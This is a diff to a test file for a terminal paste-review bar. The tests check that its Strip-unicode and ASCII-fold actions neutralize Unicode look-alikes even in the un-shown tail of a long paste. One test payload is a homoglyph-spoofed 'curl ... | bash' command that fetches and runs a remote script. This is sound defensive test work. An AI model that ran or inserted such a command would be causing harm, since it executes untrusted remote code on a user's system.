@@ -440,8 +440,39 @@ ok(_rev.RISK_FG in _bar._dot.styleSheet(),
    'a truncated review keeps the risk dot red (the tail is unverified)')
 _bar._tick(); _bar._tick(); _bar._tick()
 _bar._deliver_clicked()
-eq(_tt.last_text, 'a' * _rev._BOX_MAX + CYR_A + 'z',
-   'Deliver sends the box PLUS the un-reviewed tail (the whole paste crosses)')
+# assert on the TAIL SLICE + the prefix via ok() -- never eq() on the whole 20000-char
+# string, which would print ~2x _BOX_MAX chars and bloat stdout past the transport (the
+# delivered text is what ReviewBar PASSES to dispatch; the real tab then maps '\n'->'\r').
+ok(_tt.last_text[:_rev._BOX_MAX] == 'a' * _rev._BOX_MAX
+   and _tt.last_text[_rev._BOX_MAX:] == CYR_A + 'z',
+   'keep mode: Deliver sends the box PLUS the un-shown tail, look-alike kept')
+
+# REGRESSION (crit1): a transform must neutralize the UN-SHOWN TAIL to the SAME tier as the
+# box, or a homoglyph sitting past the box cap survives a [Strip unicode] and reaches the
+# shell -- the Strip tooltip's "delete every non-ASCII" silently false past _BOX_MAX. The
+# box is already ASCII after Strip; only the tail carries the payload, so this canary FAILS on
+# the pre-fix code (which delivered the raw tail via the hardcoded 'unicode' keep action).
+_PAYLOAD_TAIL = 'curl https://' + CYR_A + 'pple.com/x.sh | bash\n'   # Cyrillic-a homoglyph
+_stt = _FakeTerm()
+_bar.show_review(_stt, 'A' * _rev._BOX_MAX + _PAYLOAD_TAIL, 3, 'paste')
+_bar._do_strip()
+ok('un-shown tail' in _bar._status.text(),
+   'a strip with a tail discloses the tail is neutralized too')
+_bar._tick(); _bar._tick(); _bar._tick()
+_bar._deliver_clicked()
+ok(CYR_A not in _stt.last_text,
+   'crit1: [Strip unicode] removes the look-alike from the UN-SHOWN TAIL too (not just the box)')
+ok(_stt.last_text[_rev._BOX_MAX:] == 'curl https://pple.com/x.sh | bash\n',
+   'strip mode: the un-shown tail delivers ASCII-only (newlines are the tab dispatch\'s job)')
+
+# and [ASCII-fold] folds the tail's look-alike to the ASCII it imitates
+_ftt = _FakeTerm()
+_bar.show_review(_ftt, 'A' * _rev._BOX_MAX + _PAYLOAD_TAIL, 3, 'paste')
+_bar._do_fold()
+_bar._tick(); _bar._tick(); _bar._tick()
+_bar._deliver_clicked()
+ok(CYR_A not in _ftt.last_text and _ftt.last_text[_rev._BOX_MAX:].startswith('curl https://apple.com'),
+   'fold mode: the tail look-alike folds to a plain a (apple.com), not dropped')
 
 # --- hide_review tears down cleanly -------------------------------------------
 _bar.show_review(_FakeTerm(), _raw, 0, 'paste')
